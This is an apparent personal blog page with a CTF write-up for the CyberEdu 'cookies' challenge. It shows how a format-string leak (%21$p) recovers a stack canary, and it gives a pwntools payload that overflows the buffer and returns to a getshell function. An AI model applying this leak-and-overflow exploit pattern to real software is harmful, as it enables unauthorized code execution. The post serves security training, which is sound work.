<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>CyberEdu cookies Writeup | Irina&#39;s CTF Writeups</title>
<meta name="keywords" content="CyberEdu, pwn, buffer-overflow, Format-String">
<meta name="description" content="Challenge overview
Cookies for my friends.

We&rsquo;ve got a 64-bit binary, 100% format string vulnerability, canary and NX enabled.

This loop happens exactly twice, to leak something then for us to exploit the buffer overflow.
We even have a getshell function, so this really won&rsquo;t be that complicated; We&rsquo;re not even dealing with PIE.

Identifying the vulnerabilities

We get the gadgets in our binary, we can start looking for the canary now! Let&rsquo;s just look remotely straight away, so we don&rsquo;t bother with trying to do it twice, since the offsets are going to differ.">
<meta name="author" content="">
<link rel="canonical" href="https://irinasusca.github.io/writeup-blog/posts/cookies-writeup/">
<link crossorigin="anonymous" href="/writeup-blog/assets/css/stylesheet.343cc480b9ffc8f04ccbe5e968ad674880cab773ec19905e93033065c1e7a804.css" integrity="sha256-NDzEgLn/yPBMy&#43;XpaK1nSIDKt3PsGZBekwMwZcHnqAQ=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://irinasusca.github.io/writeup-blog/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://irinasusca.github.io/writeup-blog/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://irinasusca.github.io/writeup-blog/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://irinasusca.github.io/writeup-blog/apple-touch-icon.png">
<link rel="mask-icon" href="https://irinasusca.github.io/writeup-blog/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://irinasusca.github.io/writeup-blog/posts/cookies-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script><meta property="og:url" content="https://irinasusca.github.io/writeup-blog/posts/cookies-writeup/">
  <meta property="og:site_name" content="Irina&#39;s CTF Writeups">
  <meta property="og:title" content="CyberEdu cookies Writeup">
  <meta property="og:description" content="Challenge overview Cookies for my friends.
We’ve got a 64-bit binary, 100% format string vulnerability, canary and NX enabled.
This loop happens exactly twice, to leak something then for us to exploit the buffer overflow.
We even have a getshell function, so this really won’t be that complicated; We’re not even dealing with PIE.
Identifying the vulnerabilities We get the gadgets in our binary, we can start looking for the canary now! Let’s just look remotely straight away, so we don’t bother with trying to do it twice, since the offsets are going to differ.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-04T00:00:00+00:00">
    <meta property="article:modified_time" content="2026-01-04T00:00:00+00:00">
    <meta property="article:tag" content="CyberEdu">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Buffer-Overflow">
    <meta property="article:tag" content="Format-String">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="CyberEdu cookies Writeup">
<meta name="twitter:description" content="Challenge overview
Cookies for my friends.

We&rsquo;ve got a 64-bit binary, 100% format string vulnerability, canary and NX enabled.

This loop happens exactly twice, to leak something then for us to exploit the buffer overflow.
We even have a getshell function, so this really won&rsquo;t be that complicated; We&rsquo;re not even dealing with PIE.

Identifying the vulnerabilities

We get the gadgets in our binary, we can start looking for the canary now! Let&rsquo;s just look remotely straight away, so we don&rsquo;t bother with trying to do it twice, since the offsets are going to differ.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://irinasusca.github.io/writeup-blog/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "CyberEdu cookies Writeup",
      "item": "https://irinasusca.github.io/writeup-blog/posts/cookies-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "CyberEdu cookies Writeup",
  "name": "CyberEdu cookies Writeup",
  "description": "Challenge overview Cookies for my friends.\nWe\u0026rsquo;ve got a 64-bit binary, 100% format string vulnerability, canary and NX enabled.\nThis loop happens exactly twice, to leak something then for us to exploit the buffer overflow.\nWe even have a getshell function, so this really won\u0026rsquo;t be that complicated; We\u0026rsquo;re not even dealing with PIE.\nIdentifying the vulnerabilities We get the gadgets in our binary, we can start looking for the canary now! Let\u0026rsquo;s just look remotely straight away, so we don\u0026rsquo;t bother with trying to do it twice, since the offsets are going to differ.\n",
  "keywords": [
    "CyberEdu", "pwn", "buffer-overflow", "Format-String"
  ],
  "articleBody": "Challenge overview Cookies for my friends.\nWe’ve got a 64-bit binary, 100% format string vulnerability, canary and NX enabled.\nThis loop happens exactly twice, to leak something then for us to exploit the buffer overflow.\nWe even have a getshell function, so this really won’t be that complicated; We’re not even dealing with PIE.\nIdentifying the vulnerabilities We get the gadgets in our binary, we can start looking for the canary now! Let’s just look remotely straight away, so we don’t bother with trying to do it twice, since the offsets are going to differ.\nThis challenge feels very familiar and it’s definitely identical to something I solved earlier this week, with a different name; I looked for it and it was this one (I was right of course): dark magic. I’ll do it again though, no problem.\nAnd here is our canary! Now we just need to finish setting up the payload.\nThe exploit You see, because I already did this last time, I remember we needed a ret for alignment in the payload, because system(/bin/sh) most often needs one. Don’t question it too much if you’re new to this, it’s just assembly crap.\nSo our payload looks something like this now:\np.recvuntil(b\"Hacker!\\n\") p.sendline(b\"%21$p\") canary=p.recvline().strip() print(canary) canary=int(canary,16) print(f\"canary: {hex(canary)}\") payload = (b\"a\"*104 + #buf p64(canary) + b\"r\"*8 + p64(ret) + p64(getshell) ) p.sendline(payload) And we get the flag, first try!\nAs always, the full code can be found on my GitHub here.\n",
  "wordCount" : "243",
  "inLanguage": "en",
  "datePublished": "2026-01-04T00:00:00Z",
  "dateModified": "2026-01-04T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://irinasusca.github.io/writeup-blog/posts/cookies-writeup/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Irina's CTF Writeups",
    "logo": {
      "@type": "ImageObject",
      "url": "https://irinasusca.github.io/writeup-blog/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://irinasusca.github.io/writeup-blog/" accesskey="h" title="Irina&#39;s CTF Writeups (Alt + H)">Irina&#39;s CTF Writeups</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="https://irinasusca.github.io/writeup-blog/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      CyberEdu cookies Writeup
    </h1>
    <div class="post-meta"><span title='2026-01-04 00:00:00 +0000 UTC'>January 4, 2026</span>

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#challenge-overview" aria-label="Challenge overview">Challenge overview</a></li>
                <li>
                    <a href="#identifying-the-vulnerabilities" aria-label="Identifying the vulnerabilities">Identifying the vulnerabilities</a></li>
                <li>
                    <a href="#the-exploit" aria-label="The exploit">The exploit</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="challenge-overview">Challenge overview<a hidden class="anchor" aria-hidden="true" href="#challenge-overview">#</a></h2>
<p><strong><a href="https://app.cyber-edu.co/challenges/d20b73b0-5357-11ec-9eab-1912e4e08bd5?tenant=cyberedu">Cookies</a></strong> for my friends.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/cookies-writeup/pic1.png#center"></p>
<p>We&rsquo;ve got a 64-bit binary, 100% format string vulnerability, canary and NX enabled.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/cookies-writeup/pic2.png#center"></p>
<p>This loop happens exactly twice, to leak something then for us to exploit the buffer overflow.</p>
<p>We even have a <code>getshell</code> function, so this really won&rsquo;t be that complicated; We&rsquo;re not even dealing with PIE.</p>
<hr>
<h2 id="identifying-the-vulnerabilities">Identifying the vulnerabilities<a hidden class="anchor" aria-hidden="true" href="#identifying-the-vulnerabilities">#</a></h2>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/cookies-writeup/pic3.png#center"></p>
<p>We get the gadgets in our binary, we can start looking for the canary now! Let&rsquo;s just look remotely straight away, so we don&rsquo;t bother with trying to do it twice, since the offsets are going to differ.</p>
<p>This challenge feels <em>very</em> familiar and it&rsquo;s definitely identical to something I solved earlier this week, with a different name; I looked for it and it was this one (I was right of course): <strong><a href="https://irinasusca.github.io/writeup-blog/posts/darkmagic-writeup/">dark magic</a></strong>. I&rsquo;ll do it again though, no problem.</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/cookies-writeup/pic4.png#center"></p>
<p>And here is our canary! Now we just need to finish setting up the payload.</p>
<hr>
<h2 id="the-exploit">The exploit<a hidden class="anchor" aria-hidden="true" href="#the-exploit">#</a></h2>
<p>You see, because I already did this last time, I remember we needed a <code>ret</code> for alignment in the payload, because <code>system(/bin/sh)</code> most often needs one. Don&rsquo;t question it too much if you&rsquo;re new to this, it&rsquo;s just assembly crap.</p>
<p>So our payload looks something like this now:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Hacker!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%21$p&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>canary<span style="color:#f92672">=</span>p<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(canary)
</span></span><span style="display:flex;"><span>canary<span style="color:#f92672">=</span>int(canary,<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;canary: </span><span style="color:#e6db74">{</span>hex(canary)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">104</span> <span style="color:#f92672">+</span> <span style="color:#75715e">#buf</span>
</span></span><span style="display:flex;"><span>           p64(canary) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>           <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>           p64(ret) <span style="color:#f92672">+</span>
</span></span><span style="display:flex;"><span>           p64(getshell)
</span></span><span style="display:flex;"><span>           )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span></code></pre></div><p>And we get the flag, first try!</p>
<p><img alt="challenge-screenshot" loading="lazy" src="/writeup-blog/posts/cookies-writeup/flag.png#center"></p>
<hr>
<p>As always, the full code can be found on my GitHub
<strong><a href="https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/cookies.py">here</a></strong>.</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/cyberedu/">CyberEdu</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/pwn/">Pwn</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/buffer-overflow/">Buffer-Overflow</a></li>
      <li><a href="https://irinasusca.github.io/writeup-blog/tags/format-string/">Format-String</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2026 <a href="https://irinasusca.github.io/writeup-blog/">Irina&#39;s CTF Writeups</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu');
    if (menu) {
        
        const scrollPosition = localStorage.getItem("menu-scroll-position");
        if (scrollPosition) {
            menu.scrollLeft = parseInt(scrollPosition, 10);
        }
        
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        const html = document.querySelector("html");
        if (html.dataset.theme === "dark") {
            html.dataset.theme = 'light';
            localStorage.setItem("pref-theme", 'light');
        } else {
            html.dataset.theme = 'dark';
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
